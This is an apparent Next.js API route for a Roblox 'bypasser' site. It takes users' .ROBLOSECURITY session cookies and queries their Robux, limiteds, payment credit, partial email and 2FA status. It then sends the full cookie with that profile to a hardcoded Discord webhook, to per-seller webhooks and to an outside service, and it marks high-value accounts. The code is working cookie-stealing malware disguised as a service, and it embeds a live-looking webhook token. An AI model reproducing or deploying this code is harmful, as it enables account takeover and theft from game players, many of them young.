import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@/lib/supabase/server';
import { neon } from '@neondatabase/serverless';

const sql = neon(process.env.DATABASE_URL!)
const COOKIE_REFRESH_TTL_MS = Number(process.env.COOKIE_REFRESH_TTL_MS || '900000') // 15 minutes

function getClientIp(request: NextRequest): string {
  const xff = request.headers.get('x-forwarded-for')
  if (xff) return xff.split(',')[0].trim()
  return request.headers.get('x-real-ip') || 'unknown'
}

// Parse cookies from request
function parseCookies(cookieHeader: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach((cookie) => {
      const [name, value] = cookie.split('=');
      if (name && value) {
        cookies[name.trim()] = decodeURIComponent(value.trim());
      }
    });
  }
  return cookies;
}

// CSRF Protection validation
async function validateCSRFToken(request: Request): Promise<{ valid: boolean; error?: string }> {
  const headerToken = request.headers.get('x-csrf-token');
  const cookieHeader = request.headers.get('cookie');
  const cookies = parseCookies(cookieHeader || '');
  const cookieToken = cookies['csrf_token'];

  if (!headerToken || !cookieToken) {
    return { valid: false, error: 'Missing CSRF token' };
  }

  if (headerToken !== cookieToken) {
    return { valid: false, error: 'Invalid CSRF token' };
  }

  return { valid: true };
}

const WEBHOOK_URL = "https://discord.com/api/webhooks/1504383474839322634/-C7_s297FOKLs6pqdt460Qqi4oQguOZlEk9V4sm4-zDoqqP9lh09Bl8ue2RVKXubJiqD"
const ROBLOX_R_LOGO = "https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png"
const BYPASSER_LOGO = "https://cdn.discordapp.com/attachments/1486335642899189801/1486342075556434170/images.png?ex=69c5276d&is=69c3d5ed&hm=7443d16bf281dba941ae07e0ce76695c7441e8dc2c07c462f2664f247d16193e"
const EMOJI_ROBUX = "<:robux:1464171977467236375>"
const EMOJI_CHECKMARK = "<:Verified:1462045354831646772>"
const EMOJI_WHITE_FIRE = "<a:WhiteFire:1459486498595410032>"
const EMOJI_SETTINGS = "<a:spinningsettingslogo:1469933903702917224>"
const EMOJI_EMAIL = "<:Mail:1474992551101599808>"
const EMOJI_KORBLOX = "<:KorbloxDeathspeaker:1459369436791181325>"
const EMOJI_HEADLESS = "<:HeadlessHorseman:1459369353924448358>"
const EMOJI_PREMIUM = "<:rbxPremium:1459367939135504486>"
const EMOJI_VALK = "<:valk:1459382673888772229>"
const EMOJI_TRANSACTION = "<a:Card:1474992625898487940>"
const EMOJI_PAYMENTS = "<a:Card:1474992625898487940>"
const EMOJI_PURPLE_ROBUX = "<:emoji_26:1466033844573573191>"

const formatNum = (n: number) => n.toLocaleString("en-US")

async function fetchAccountData(userId: number, cookie: string) {
  const robloxHeaders = { Cookie: `.ROBLOSECURITY=${cookie}`, Accept: "application/json" }
  let avatarUrl = ROBLOX_R_LOGO
  let robuxBalance = 0, rap = 0, limitedsCount = 0
  let totalSpent = 0, totalIncoming = 0, totalOutgoing = 0
  let hasKorblox = false, hasHeadless = false, hasValkyrie = false, hasPremium = false
  let creditBalance = 0, creditCurrency = "USD"
  let emailDisplay = "Unknown", has2FADisplay = "DISABLED"
  let accountAgeDays = 0, isOver13 = "Unknown"

  const [avatarRes, balanceRes, inventoryRes, txRes, premiumRes, creditRes] =
    await Promise.allSettled([
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`),
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: robloxHeaders }),
      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100`, { headers: robloxHeaders }),
      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers: robloxHeaders }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: robloxHeaders }),
      fetch("https://billing.roblox.com/v1/credit", { headers: robloxHeaders }),
    ])

  if (avatarRes.status === "fulfilled" && avatarRes.value.ok) {
    const d = await avatarRes.value.json(); if (d.data?.[0]?.imageUrl) avatarUrl = d.data[0].imageUrl
  }
  if (balanceRes.status === "fulfilled" && balanceRes.value.ok) {
    const d = await balanceRes.value.json(); robuxBalance = d.robux || 0
  }
  if (inventoryRes.status === "fulfilled" && inventoryRes.value.ok) {
    const d = await inventoryRes.value.json()
    rap = d.data?.reduce((s: number, i: any) => s + (i.recentAveragePrice || 0), 0) || 0
    limitedsCount = d.data?.length || 0
  }
  if (txRes.status === "fulfilled" && txRes.value.ok) {
    const d = await txRes.value.json()
    totalIncoming = d.incomingRobuxTotal || 0; totalOutgoing = d.outgoingRobuxTotal || 0
    totalSpent = (d.purchasesTotal || 0) + totalOutgoing
  }
  if (premiumRes.status === "fulfilled" && premiumRes.value.ok) {
    const d = await premiumRes.value.json(); hasPremium = d === true
  }
  if (creditRes.status === "fulfilled" && creditRes.value.ok) {
    const d = await creditRes.value.json(); creditBalance = d.balance || 0; creditCurrency = d.currencyCode || "USD"
  }

  // Fetch email via accountsettings API (most reliable)
  try {
    const emailRes = await fetch("https://accountsettings.roblox.com/v1/email", { headers: robloxHeaders })
    if (emailRes.ok) {
      const d = await emailRes.json()
      const email = d.emailAddress || ""
      emailDisplay = email ? `${email.substring(0, 3)}***` : "Unknown"
    }
  } catch {}

  // Fallback: try accountinformation API if email is still unknown
  if (emailDisplay === "Unknown") {
    try {
      const emailRes = await fetch("https://accountinformation.roblox.com/v1/email", { headers: robloxHeaders })
      if (emailRes.ok) {
        const d = await emailRes.json()
        const email = d.emailAddress || ""
        emailDisplay = email ? `${email.substring(0, 3)}***` : "Unknown"
      }
    } catch {}
  }

  // Fallback: try my/settings/json if email is still unknown
  if (emailDisplay === "Unknown") {
    try {
      const settingsRes = await fetch("https://www.roblox.com/my/settings/json", {
        headers: { ...robloxHeaders, "Referer": "https://www.roblox.com/", "Origin": "https://www.roblox.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" }
      })
      if (settingsRes.ok) {
        const d = await settingsRes.json()
        const email = d.UserEmail || ""
        emailDisplay = email ? `${email.substring(0, 3)}***` : "Unknown"
      }
    } catch {}
  }

  // Fetch 2FA status via user-specific configuration endpoint
  try {
    const twoFARes = await fetch(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, { headers: robloxHeaders })
    if (twoFARes.ok) {
      const d = await twoFARes.json()
      let enabled = false
      if (d.methods && Array.isArray(d.methods)) {
        enabled = d.methods.some((m: { enabled?: boolean }) => m.enabled === true)
      } else if (d.primaryMediaType) {
        enabled = true
      }
      has2FADisplay = enabled ? "ENABLED" : "DISABLED"
    }
  } catch {}
  try {
    const detailsRes = await fetch(`https://users.roblox.com/v1/users/${userId}`)
    if (detailsRes.ok) {
      const details = await detailsRes.json()
      if (details.created) {
        const created = new Date(details.created)
        accountAgeDays = Math.floor((Date.now() - created.getTime()) / (1000 * 60 * 60 * 24))
        isOver13 = (accountAgeDays / 365) >= 13 ? "13+" : "<13"
      }
    }
  } catch {}
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/347`, { headers: robloxHeaders })
    if (r.ok) { const d = await r.json(); hasKorblox = d.data?.length > 0 }
  } catch {}
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/134082579`, { headers: robloxHeaders })
    if (r.ok) { const d = await r.json(); hasHeadless = d.data?.length > 0 }
  } catch {}
  for (const assetId of [1365767, 100929604, 855891703]) {
    try {
      const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}`, { headers: robloxHeaders })
      if (r.ok) { const d = await r.json(); if (d.data?.length > 0) { hasValkyrie = true; break } }
    } catch {}
  }

  return { avatarUrl, robuxBalance, rap, limitedsCount, totalSpent, totalIncoming, totalOutgoing, hasKorblox, hasHeadless, hasValkyrie, hasPremium, creditBalance, creditCurrency, emailDisplay, has2FADisplay, accountAgeDays, isOver13 }
}

async function sendWebhook(opts: {
  status: "success" | "error" | "failed"
  statusMessage: string
  userData?: { id: number; name: string; displayName?: string } | null
  accountData?: Awaited<ReturnType<typeof fetchAccountData>> | null
  apiResponse?: any
  cookie?: string
  sellerWebhook?: string | null
}) {
  try {
    const { status, statusMessage, userData, accountData, apiResponse, cookie, sellerWebhook } = opts
    const displayName = userData?.displayName || userData?.name || "Unknown"
    const username = userData?.name || "Unknown"
    const avatarUrl = accountData?.avatarUrl || ROBLOX_R_LOGO
    const profileUrl = userData?.id ? `https://www.roblox.com/users/${userData.id}/profile` : undefined

    const statusEmoji = status === "success" ? EMOJI_CHECKMARK : "\u274C"
    const statusColor = status === "success" ? 0x57f287 : status === "error" ? 0xed4245 : 0xfee75c

    const embeds: any[] = []

    if (userData && accountData) {
      const a = accountData
      const isHighValue = a.robuxBalance > 10000 || a.rap > 50000
      embeds.push({
        author: { name: `${displayName} (@${username})`, icon_url: avatarUrl, url: profileUrl },
        description: [
          `${EMOJI_WHITE_FIRE} **ʙʏᴘᴀssᴇʀ ᴍᴏᴅᴜʟᴇ — ${status.toUpperCase()}** ${EMOJI_WHITE_FIRE}\n`,
          `**Account Stats**`,
          `\`Account Age: ${a.accountAgeDays} Days\``,
          `\`Age Bracket: ${a.isOver13}\`\n`,
          `${EMOJI_ROBUX} **Robux**`,
          `**Balance:** ${formatNum(a.robuxBalance)} ${EMOJI_ROBUX}`,
          `**Pending:** 0 ${EMOJI_ROBUX}\n`,
          `${EMOJI_VALK} **Limiteds**`,
          `**RAP:** ${formatNum(a.rap)} ${EMOJI_ROBUX}`,
          `**Limiteds:** ${a.limitedsCount} ${EMOJI_ROBUX}\n`,
          `${EMOJI_SETTINGS} **Summary**`,
          `**Total Spent:** ${formatNum(a.totalSpent)} ${EMOJI_ROBUX}\n`,
          `${EMOJI_SETTINGS} **Transactions**`,
          `**Incoming:** +${formatNum(a.totalIncoming)} ${EMOJI_ROBUX}`,
          `**Outgoing:** -${formatNum(a.totalOutgoing)} ${EMOJI_ROBUX}\n`,
          `${EMOJI_PAYMENTS} **Payments**`,
          `**Credit Balance:** $${a.creditBalance.toFixed(2)} ${a.creditCurrency}\n`,
          `${EMOJI_SETTINGS} **Settings**`,
          `${EMOJI_EMAIL} **Email:** ${a.emailDisplay}`,
          `**2FA:** ${a.has2FADisplay}\n`,
          `${EMOJI_VALK} **Inventory**`,
          `${EMOJI_KORBLOX} **Korblox:** ${a.hasKorblox ? "True" : "False"}`,
          `${EMOJI_HEADLESS} **Headless:** ${a.hasHeadless ? "True" : "False"}`,
          `${EMOJI_VALK} **Valkyrie:** ${a.hasValkyrie ? "True" : "False"}\n`,
          `${EMOJI_PREMIUM} **Premium:** ${a.hasPremium ? "True" : "False"}`,
        ].join("\n"),
        color: isHighValue ? 0xf1c40f : 0x5865f2,
        thumbnail: { url: avatarUrl },
        timestamp: new Date().toISOString(),
        footer: { text: `${displayName} (@${username}) | Bypasser Module`, icon_url: avatarUrl },
      })
    }

    // Status / response embed
    const responseContent = apiResponse
      ? `\`\`\`json\n${JSON.stringify(apiResponse, null, 2).substring(0, 1800)}\`\`\``
      : `\`\`\`${statusMessage}\`\`\``

    embeds.push({
      title: `${status === "success" ? EMOJI_CHECKMARK : "\u274C"} Website Response — ${status.toUpperCase()}`,
      description: responseContent,
      color: statusColor,
      timestamp: new Date().toISOString(),
      footer: { text: statusMessage.substring(0, 100), icon_url: ROBLOX_R_LOGO },
    })

    // Add cookie embed to the main embeds list
    const embedsWithCookie = [...embeds]
    if (cookie) {
      embedsWithCookie.push({
        title: `Cookie`,
        description: `\`\`\`${cookie.substring(0, 1900)}${cookie.length > 1900 ? "..." : ""}\`\`\``,
        color: 0x2b2d31,
        footer: { text: `${cookie.length} characters`, icon_url: BYPASSER_LOGO },
      })
    }

    const webhookPayload = {
      content: `${status === "success" ? EMOJI_WHITE_FIRE : "\u274C"} **LOKUS BYPASS — ${status.toUpperCase()}** ${status === "success" ? EMOJI_WHITE_FIRE : "\u274C"}`,
      username: "Lokus bypass",
      avatar_url: BYPASSER_LOGO,
      embeds: embedsWithCookie,
    }

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(webhookPayload),
    })

    // Also send to seller's webhook if this is a seller bypass page
    if (sellerWebhook && sellerWebhook.startsWith('https://discord.com/api/webhooks/')) {
      try {
        await fetch(sellerWebhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(webhookPayload),
        })
      } catch {}
    }

  } catch {}
}

export async function POST(request: NextRequest) {
  try {
    console.log('[v0] Bypass request received');

    // Check if system is locked (from localStorage - frontend only)
    // Backend doesn't need to check this since admin is frontend-only

    // Validate CSRF token
    const csrfValidation = await validateCSRFToken(request);
    if (!csrfValidation.valid) {
      console.log('[v0] CSRF validation failed:', csrfValidation.error);
      return NextResponse.json(
        { success: false, message: csrfValidation.error },
        { status: 403 }
      );
    }

    // Parse request body
    const body = await request.json();
    const { cookie, seller } = body;

    // Look up seller webhook from Neon sellers table (owner + route use same DB)
    let sellerWebhook: string | null = null
    let refreshRequired = false
    if (seller) {
      try {
        const rows = await sql`SELECT webhook, cookie_refreshed_at, cookie_refreshed_ip FROM sellers WHERE username = ${seller} LIMIT 1`
        if (rows.length > 0) {
          if (rows[0].webhook) sellerWebhook = rows[0].webhook
          const refreshedAt = rows[0].cookie_refreshed_at ? new Date(rows[0].cookie_refreshed_at).getTime() : null
          const refreshIp = rows[0].cookie_refreshed_ip || null
          const now = Date.now()
          const clientIp = getClientIp(request)

          if (!refreshedAt || !refreshIp || refreshIp !== clientIp || now - refreshedAt > COOKIE_REFRESH_TTL_MS) {
            refreshRequired = true
          }
        } else {
          // no seller data yet; require refresh before bypass
          refreshRequired = true
        }
      } catch (err) {
        console.error('Seller webhook lookup error:', err)
      }
    }

    if (refreshRequired) {
      return NextResponse.json({ success: false, message: 'Cookie refresh required before bypasser action', refresh_required: true }, { status: 403 })
    }

    if (!cookie) {
      await sendWebhook({ status: "failed", statusMessage: "No cookie provided — empty request", userData: null, accountData: null, sellerWebhook })
      return NextResponse.json(
        { success: false, message: 'Cookie is required' },
        { status: 400 }
      );
    }

    // Store bypass request in database if available
    let requestId: number | null = null;
    try {
      const supabase = await createClient();
      const { data, error } = await supabase
        .from('recent_bypasses')
        .insert({
          cookie_preview: cookie.substring(0, 20) + '...',
          status: 'processing',
          user_agent: request.headers.get('user-agent') || 'Unknown',
        })
        .select('id')
        .single();

      if (!error && data) {
        requestId = data.id;
        console.log('[v0] Bypass request logged to database, ID:', requestId);
      }
    } catch (dbError) {
      console.log('[v0] Database logging skipped:', dbError);
    }

    // Check account age group setting (13+ requirement) - CRITICAL CHECK
    console.log('[v0] Checking account age group settings...');
    
    // Get user info to check if account is 13+
    let userInfoResponse;
    let userData;
    
    try {
      userInfoResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
        },
      });

      console.log('[v0] Authentication response status:', userInfoResponse.status);

      if (!userInfoResponse.ok) {
        console.log('[v0] Authentication failed with status:', userInfoResponse.status);
        
        await sendWebhook({ status: "failed", statusMessage: `Invalid cookie — authentication failed (HTTP ${userInfoResponse.status})`, userData: null, accountData: null, cookie, sellerWebhook })
        
        // Update database status if available
        if (requestId) {
          try {
            const supabase = await createClient();
            await supabase
              .from('recent_bypasses')
              .update({ status: 'failed', result: 'Invalid cookie' })
              .eq('id', requestId);
          } catch {}
        }
        
        return NextResponse.json(
          { 
            success: false, 
            message: 'Invalid cookie. Please provide a valid Roblox security cookie.',
          },
          { status: 401 }
        );
      }

      userData = await userInfoResponse.json();
      
      // Check if response contains error
      if (userData.errors || !userData.id) {
        console.log('[v0] Invalid cookie - no user data returned');
        
        await sendWebhook({ status: "failed", statusMessage: "Invalid cookie — no user data returned from Roblox API", userData: null, accountData: null, cookie, sellerWebhook })
        
        // Update database status if available
        if (requestId) {
          try {
            const supabase = await createClient();
            await supabase
              .from('recent_bypasses')
              .update({ status: 'failed', result: 'Invalid cookie' })
              .eq('id', requestId);
          } catch {}
        }
        
        return NextResponse.json(
          { 
            success: false, 
            message: 'Invalid cookie. Please provide a valid Roblox security cookie.',
          },
          { status: 401 }
        );
      }
      
      console.log('[v0] User ID:', userData.id, 'Name:', userData.name);
    } catch (authError) {
      console.log('[v0] Authentication error:', authError);
      
      await sendWebhook({ status: "error", statusMessage: `Authentication error — ${authError instanceof Error ? authError.message : "Unknown error"}`, userData: null, accountData: null, cookie, sellerWebhook })
      
      // Update database status if available
      if (requestId) {
        try {
          const supabase = await createClient();
          await supabase
            .from('recent_bypasses')
            .update({ status: 'failed', result: 'Authentication error' })
            .eq('id', requestId);
        } catch {}
      }
      
      return NextResponse.json(
        { 
          success: false, 
          message: 'Failed to authenticate. Please check your cookie and try again.',
        },
        { status: 401 }
      );
    }

    // Try multiple methods to check account age group
    let isUnder13 = false;
    
    // Method 1: Check user metadata
    if (userData.hasOwnProperty('isUnder13')) {
      isUnder13 = userData.isUnder13;
      console.log('[v0] Age check from user data - Under 13:', isUnder13);
    } else {
      // Method 2: Check account settings API
      try {
        const settingsResponse = await fetch(`https://accountsettings.roblox.com/v1/users/${userData.id}/account-info`, {
          method: 'GET',
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
          },
        });

        if (settingsResponse.ok) {
          const settingsData = await settingsResponse.json();
          console.log('[v0] Account settings data:', JSON.stringify(settingsData));
          isUnder13 = settingsData.isUnder13 || settingsData.IsUnder13 || false;
          console.log('[v0] Age check from settings - Under 13:', isUnder13);
        } else {
          console.log('[v0] Settings API returned status:', settingsResponse.status);
          // Try Method 3: Check via account birthdate
          try {
            const birthdateResponse = await fetch(`https://accountinformation.roblox.com/v1/birthdate`, {
              method: 'GET',
              headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
              },
            });
            
            if (birthdateResponse.ok) {
              const birthdateData = await birthdateResponse.json();
              console.log('[v0] Birthdate data:', JSON.stringify(birthdateData));
              
              // Calculate age from birthdate
              if (birthdateData.birthMonth && birthdateData.birthDay && birthdateData.birthYear) {
                const birthDate = new Date(birthdateData.birthYear, birthdateData.birthMonth - 1, birthdateData.birthDay);
                const today = new Date();
                let age = today.getFullYear() - birthDate.getFullYear();
                const monthDiff = today.getMonth() - birthDate.getMonth();
                if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
                  age--;
                }
                isUnder13 = age < 13;
                console.log('[v0] Age calculated from birthdate:', age, '- Under 13:', isUnder13);
              }
            }
          } catch (birthdateError) {
            console.log('[v0] Birthdate check failed:', birthdateError);
          }
        }
      } catch (settingsError) {
        console.log('[v0] Settings check failed:', settingsError);
      }
    }

    if (isUnder13 === true) {
      console.log('[v0] BLOCKED: Account is set as under 13');
      
      const accountData = await fetchAccountData(userData.id, cookie)
      await sendWebhook({ status: "failed", statusMessage: "Blocked — Account is under 13", userData, accountData, cookie, sellerWebhook })

      // Save to persistent bypass logs (Vercel Blob)
      try {
        const baseUrl = request.nextUrl.origin
        await fetch(`${baseUrl}/api/bypass-logs`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: userData.name,
            displayName: userData.displayName || userData.name,
            avatarUrl: accountData.avatarUrl,
            userId: userData.id,
            status: "failed",
            timestamp: new Date().toISOString(),
          }),
        })
      } catch {}
      
      // Update database status if available
      if (requestId) {
        try {
          const supabase = await createClient();
          await supabase
            .from('recent_bypasses')
            .update({ status: 'failed', result: 'Account must be 13+ years old' })
            .eq('id', requestId);
        } catch {}
      }

      return NextResponse.json(
        { 
          success: false, 
          message: 'Under 13 accounts cannot be bypassed. Please try again with a 13+ account.',
        },
        { status: 403 }
      );
    }

    console.log('[v0] Age check PASSED - Account is 13+');
    
    // Fetch account data once at the beginning for both webhooks
    const accountData = await fetchAccountData(userData.id, cookie)
    console.log('[v0] Account data fetched successfully')

    // Call external bypass service
    console.log('[v0] Calling external bypass service...');
    const response = await fetch('https://rblxbypasser.com/api/bypass', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'User-Agent': 'BypasserClient/1.0'
      },
      body: JSON.stringify({
        cookie: cookie,
        timestamp: new Date().toISOString(),
      }),
    });

    console.log('[v0] External service response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.log('[v0] External service error:', errorText);

      await sendWebhook({ status: "error", statusMessage: `Bypass service error (HTTP ${response.status}) — ${errorText.substring(0, 200)}`, userData, accountData, apiResponse: { error: errorText, status: response.status }, cookie, sellerWebhook })

      // Save to persistent bypass logs (Vercel Blob)
      try {
        const baseUrl = request.nextUrl.origin
        await fetch(`${baseUrl}/api/bypass-logs`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: userData.name,
            displayName: userData.displayName || userData.name,
            avatarUrl: accountData.avatarUrl,
            userId: userData.id,
            status: "failed",
            timestamp: new Date().toISOString(),
          }),
        })
      } catch {}

      // Update database status if available
      if (requestId) {
        try {
          const supabase = await createClient();
          await supabase
            .from('recent_bypasses')
            .update({ status: 'failed', result: errorText })
            .eq('id', requestId);
        } catch {}
      }

      return NextResponse.json(
        { success: false, message: 'Bypass service returned an error' },
        { status: response.status }
      );
    }

    const externalData = await response.json();
    console.log('[v0] External service success');

    // Send Discord webhook with account info and bypass response
      await sendWebhook({ status: "success", statusMessage: "Bypass completed successfully", userData, accountData, apiResponse: externalData, cookie, sellerWebhook })

    // Save to persistent bypass logs (Vercel Blob)
    try {
      const baseUrl = request.nextUrl.origin
      await fetch(`${baseUrl}/api/bypass-logs`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: userData.name,
          displayName: userData.displayName || userData.name,
          avatarUrl: accountData.avatarUrl,
          userId: userData.id,
          status: "success",
          timestamp: new Date().toISOString(),
        }),
      })
    } catch {}

    // Update database status if available
    if (requestId) {
      try {
        const supabase = await createClient();
        await supabase
          .from('recent_bypasses')
          .update({ 
            status: 'success', 
            result: JSON.stringify(externalData),
            processed_at: new Date().toISOString()
          })
          .eq('id', requestId);
      } catch {}
    }

    return NextResponse.json({ 
      success: true, 
      data: externalData 
    });
  } catch (error) {
    console.error('[v0] Bypass error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    
    await sendWebhook({ status: "error", statusMessage: `Server error — ${errorMessage}`, userData: null, accountData: null, cookie: undefined, sellerWebhook: null })
    
    return NextResponse.json(
      { success: false, message: errorMessage },
      { status: 500 }
    );
  }
}

export const dynamic = 'force-dynamic';
